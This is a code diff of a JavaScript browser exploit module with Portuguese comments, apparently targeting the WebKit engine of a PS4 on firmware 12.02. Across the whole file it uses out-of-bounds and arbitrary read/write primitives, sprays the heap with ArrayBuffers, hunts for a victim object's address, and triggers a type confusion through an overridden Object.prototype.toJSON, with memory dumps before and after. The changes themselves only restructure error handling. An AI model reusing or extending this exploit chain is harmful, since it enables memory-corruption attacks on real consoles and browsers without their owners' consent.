@@ -1,4 +1,4 @@
-// js/script3/testArrayBufferVictimCrash.mjs (Versão Final Corrigida e Funcional)
+// js/script3/testArrayBufferVictimCrash.mjs (Versão Final v4.1 - Corrigido TypeError)
 import { logS3, PAUSE_S3 } from './s3_utils.mjs';
 import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
 import {
@@ -12,11 +12,7 @@ import {
 } from '../core_exploit.mjs';
 import { OOB_CONFIG } from '../config.mjs';
 
-export const FNAME_MODULE_V28 = "FinalFunctionalExploit_v4";
-
-// =======================================================================================
-// CONSTANTES CRÍTICAS E DE CONFIGURAÇÃO
-// =======================================================================================
+export const FNAME_MODULE_V28 = "FinalFunctionalExploit_v4_1";
 
 // --- Constantes para a Fase 1: Verificação de Primitivas ---
 const GETTER_TARGET_ADDR = new AdvancedInt64(0x00000D00, 0x00000000);
@@ -29,12 +25,8 @@ const HEISENBUG_TRIGGER_OFFSET = 0x7C;
 const HEISENBUG_TRIGGER_VALUE  = 0xFFFFFFFF;
 const VICTIM_AB_SIZE = 64;
 
-// =======================================================================================
 // !! VOCÊ PRECISA FORNECER ESTE VALOR !!
-// Use um depurador ou outro método para encontrar o ID da Estrutura (Structure ID)
-// de um objeto ArrayBuffer no seu ambiente alvo (PS4 12.02).
 const VICTIM_ARRAYBUFFER_STRUCTURE_ID = new AdvancedInt64("0xDEADBEEF"); // SUBSTITUA 0xDEADBEEF PELO ID REAL!
-// =======================================================================================
 
 let victim_ab_ref = null;
 let object_to_leak_ref = null;
@@ -50,8 +42,10 @@ async function find_victim_address_via_arb_read() {
         logS3(`[addrof] AVISO: VICTIM_ARRAYBUFFER_STRUCTURE_ID não foi definido. A caça provavelmente falhará.`, "warn");
     }
 
-    const base_buffer_addr = await oob_read_absolute(0x58 + 0x10, 8); // 0x68 é o offset de m_vector
-    if (!base_buffer_addr || base_buffer_addr.isZero()) {
+    const base_buffer_addr = await oob_read_absolute(0x58 + 0x10, 8);
+    
+    // LINHA CORRIGIDA ABAIXO
+    if (!base_buffer_addr || base_buffer_addr.equals(new AdvancedInt64(0, 0))) {
         logS3(`[addrof] FALHA: Não foi possível obter o endereço base do oob_array_buffer_real.`, "critical");
         return null;
     }
@@ -60,7 +54,7 @@ async function find_victim_address_via_arb_read() {
     const search_start_addr = base_buffer_addr.add(OOB_CONFIG.ALLOCATION_SIZE);
     logS3(`[addrof] Iniciando busca a partir do endereço absoluto: ${search_start_addr.toString(true)}`, "info");
     
-    const search_limit = 8192; // Aumentado limite de busca
+    const search_limit = 8192;
     for (let i = 0; i < search_limit; i += 8) {
         try {
             const current_search_addr = search_start_addr.add(i);
@@ -125,7 +119,6 @@ async function verifyingGetter() {
         const targetAddr = oob_read_absolute(GETTER_ADDR_PLANT_OFFSET, 8);
         const dataRead = await arb_read(targetAddr, 8);
         oob_write_absolute(GETTER_DATA_COPY_OFFSET, dataRead, 8);
-
         if (dataRead.equals(GETTER_TARGET_DATA)) {
             getter_phase1_result = true;
         }
@@ -143,7 +136,6 @@ export async function executeArrayBufferVictimCrashTest() {
     logS3(`==== INICIANDO CADEIA DE EXPLORAÇÃO COMPLETA ====`, "test", FNAME_CURRENT_TEST);
 
     try {
-        // ETAPA 0: INICIALIZAÇÃO OBRIGATÓRIA
         await triggerOOB_primitive({ force_reinit: true });
         if (!isOOBReady()) throw new Error("Falha na inicialização do ambiente OOB.");
         logS3("Ambiente OOB configurado com sucesso.", "good", FNAME_CURRENT_TEST);
@@ -153,12 +145,10 @@ export async function executeArrayBufferVictimCrashTest() {
         getter_phase1_result = false;
         await arb_write(GETTER_TARGET_ADDR, GETTER_TARGET_DATA, 8);
         oob_write_absolute(GETTER_ADDR_PLANT_OFFSET, GETTER_TARGET_ADDR, 8);
-
         const getter_obj = {};
         Object.defineProperty(getter_obj, 'trigger', { get: verifyingGetter, configurable: true });
         getter_obj.trigger;
         await PAUSE_S3(500);
-
         if (getter_phase1_result) {
             logS3("FASE 1 SUCESSO: Primitivas arb_read e arb_write estão operacionais.", "good", FNAME_CURRENT_TEST);
         } else {
@@ -167,7 +157,6 @@ export async function executeArrayBufferVictimCrashTest() {
 
         // --- FASE 2: Obtenção de 'addrof' e Análise da Confusão de Tipos ---
         logS3(`\n--- FASE 2: Obtenção de 'addrof' e Análise de Memória ---`, "subtest", FNAME_CURRENT_TEST);
-
         logS3("[Heap Grooming] Alocando objetos para preparar o heap...", "info");
         const spray = [];
         for (let i = 0; i < 2000; i++) { spray.push(new ArrayBuffer(VICTIM_AB_SIZE)); }
@@ -176,28 +165,23 @@ export async function executeArrayBufferVictimCrashTest() {
         logS3("[Heap Grooming] Preparação do heap concluída. Tentando localizar o objeto vítima...", "info");
         
         const addr_victim_ab = await find_victim_address_via_arb_read();
+        if (!addr_victim_ab) throw new Error("addrof_failed");
+       
+        logS3("--- Dump de Memória ANTES da Confusão ---", "info");
+        await dump_memory(addr_victim_ab);
 
-        if (addr_victim_ab) {
-            logS3("--- Dump de Memória ANTES da Confusão ---", "info");
-            await dump_memory(addr_victim_ab);
+        logS3("Ativando a Confusão de Tipos...", "warn");
+        oob_write_absolute(HEISENBUG_TRIGGER_OFFSET, HEISENBUG_TRIGGER_VALUE, 4);
+        let originalToJSON = Object.getOwnPropertyDescriptor(Object.prototype, 'toJSON');
+        Object.defineProperty(Object.prototype, 'toJSON', { value: () => ({}), configurable: true });
+        JSON.stringify(victim_ab_ref);
+        if (originalToJSON) Object.defineProperty(Object.prototype, 'toJSON', originalToJSON); else delete Object.prototype.toJSON;
+        await PAUSE_S3(100);
 
-            logS3("Ativando a Confusão de Tipos...", "warn");
-            oob_write_absolute(HEISENBUG_TRIGGER_OFFSET, HEISENBUG_TRIGGER_VALUE, 4);
-            let originalToJSON = Object.getOwnPropertyDescriptor(Object.prototype, 'toJSON');
-            Object.defineProperty(Object.prototype, 'toJSON', { value: () => ({}), configurable: true });
-            JSON.stringify(victim_ab_ref);
-            if (originalToJSON) Object.defineProperty(Object.prototype, 'toJSON', originalToJSON); else delete Object.prototype.toJSON;
-            await PAUSE_S3(100);
-
-            logS3("--- Dump de Memória DEPOIS da Confusão ---", "info");
-            await dump_memory(addr_victim_ab);
-            logS3("Análise de Memória Concluída. Compare os dumps para encontrar o vetor de exploração.", "good");
-            document.title = "Análise de Memória OK";
-
-        } else {
-            logS3("FALHA CRÍTICA NA FASE 2: Não foi possível obter o endereço do objeto vítima. Abortando análise.", "critical", FNAME_CURRENT_TEST);
-            throw new Error("addrof_failed");
-        }
+        logS3("--- Dump de Memória DEPOIS da Confusão ---", "info");
+        await dump_memory(addr_victim_ab);
+        logS3("Análise de Memória Concluída. Compare os dumps para encontrar o vetor de exploração.", "good");
+        document.title = "Análise de Memória OK";
 
         // --- FASE 3: Reavaliação da Tentativa de Addrof ---
         logS3(`\n--- FASE 3: Reavaliando a tentativa de 'addrof'... ---`, "subtest", FNAME_CURRENT_TEST);
@@ -208,10 +192,10 @@ export async function executeArrayBufferVictimCrashTest() {
         type_confusion_details = null;
 
         oob_write_absolute(HEISENBUG_TRIGGER_OFFSET, HEISENBUG_TRIGGER_VALUE, 4);
-        let originalToJSON = Object.getOwnPropertyDescriptor(Object.prototype, 'toJSON');
+        let originalToJSON2 = Object.getOwnPropertyDescriptor(Object.prototype, 'toJSON');
         Object.defineProperty(Object.prototype, 'toJSON', { value: toJSON_ProbeForAddrof, configurable: true });
         JSON.stringify(victim_ab_ref);
-        if (originalToJSON) Object.defineProperty(Object.prototype, 'toJSON', originalToJSON); else delete Object.prototype.toJSON;
+        if (originalToJSON2) Object.defineProperty(Object.prototype, 'toJSON', originalToJSON2); else delete Object.prototype.toJSON;
 
         if (type_confusion_details && type_confusion_details.this_type === '[object Object]') {
             logS3("Confusão de tipos confirmada na Fase 3.", "good");
@@ -235,6 +219,8 @@ export async function executeArrayBufferVictimCrashTest() {
         if(e.message !== "addrof_failed") {
             logS3(`ERRO CRÍTICO NA EXECUÇÃO: ${e.name} - ${e.message}`, "critical", FNAME_CURRENT_TEST);
             if(e.stack) logS3(e.stack, "critical");
+        } else {
+            logS3("FALHA CRÍTICA NA FASE 2: Não foi possível obter o endereço do objeto vítima. Abortando análise.", "critical", FNAME_CURRENT_TEST);
         }
     } finally {
         clearOOBEnvironment();
